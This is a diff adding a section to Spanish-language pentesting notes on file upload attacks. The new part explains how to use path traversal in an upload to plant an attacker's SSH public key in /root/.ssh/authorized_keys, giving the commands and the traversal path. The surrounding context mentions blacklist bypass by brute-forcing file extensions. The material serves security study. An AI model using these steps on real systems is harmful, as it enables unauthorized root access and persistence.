@@ -60,6 +60,23 @@ Para esto podemos combinar el path transversal agregándolo en la cabecera Conte
 Luego, con el mismo path transversal podemos llamarlo. (puede que al momento de llamarlo, si debimos encodear el path}
 transversal en la subida, no debamos encodearlo en la ejecución).
 
+### RSA implant
+
+Si contamos con path transversal en el upload podríamos crear una rsa key e implantarsela a un usuario.
+
+        ssh-keygen -t rsa
+
+
+Luego metemos el .pub en el archivo uthorized_keys
+
+        cat pop.pub > authorized_keys 
+
+Luego subimos el archivo aprovechando el path transversal hasta una carpeta de un usuario. Ej:
+
+        ../../../../../../../root/.ssh/authorized_keys
+
+Luego nos logueamos por ssh con la rsa_id
+
 #### Blacklist bypass:
 Fuerza bruta de extensión:
 Si nos encontramos un filtro de blacklist, podemos hacer fuerza bruta sobre la extención del archivo malicioso buscando una extención permitida.
